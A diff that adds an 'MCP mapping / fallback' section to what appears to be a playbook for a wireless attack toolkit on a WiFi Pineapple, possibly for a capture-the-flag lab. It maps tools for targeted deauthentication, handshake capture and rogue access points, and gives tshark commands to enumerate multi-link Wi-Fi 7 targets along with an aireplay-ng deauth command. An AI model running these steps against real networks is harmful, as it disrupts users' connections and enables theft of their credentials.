@@ -49,6 +49,45 @@ run_sequence([
 ])
 ```
 
+## MCP mapping / fallback
+
+None of `list_mld_targets`, `deauth_targeted`, `capture_start`,
+`capture_stop`, `hostapd_up` are exposed as MCP tools with those exact
+names. The closest mappings are:
+
+- `deauth_targeted` → `server.do_deauth(bssid=..., client_mac=..., count=...)`
+  or the `deauth` action in `run_sequence`.
+- `capture_start` / `capture_stop` → **no `src/` equivalent** — drive
+  `tcpdump`/`hcxdumptool` on the Pineapple over SSH, or use
+  `server.do_capture_handshake` for a bounded window.
+- `hostapd_up` → `server.do_create_rogue_ap(ssid, channel, security,
+  psk, ...)` (WPA-PSK only for now — no WPA-EAP in the current API).
+- `list_mld_targets` → parse the pcap; there's no dedicated tool.
+
+**Fallback shell chain — enumerate MLDs and per-link BSSIDs:**
+
+```bash
+# EHT Capabilities is Extension-ID 108 (wlan.tag.ext.number == 108).
+# Basic Multi-Link element is Extension-ID 107.
+tshark -r /tmp/recon.pcapng \
+    -Y "wlan.fc.type_subtype == 8 && wlan.ext_tag.number == 108" \
+    -T fields -e wlan.bssid -e wlan.ssid -e wlan.ds.current_channel \
+  | sort -u
+
+# Association Requests carrying the Basic Multi-Link element:
+tshark -r /tmp/recon.pcapng \
+    -Y "wlan.fc.type_subtype == 0 && wlan.ext_tag.number == 107" \
+    -T fields -e wlan.sa -e wlan.bssid \
+    -e wlan.ext_tag.data
+```
+
+**Fallback shell chain — per-link deauth (PMF-off only):**
+
+```bash
+sudo aireplay-ng -0 3 -a <per-link-BSSID-2.4> \
+    -c <per-link-MAC-2.4> wlan1mon
+```
+
 ## The flag surface
 
 Two candidates:
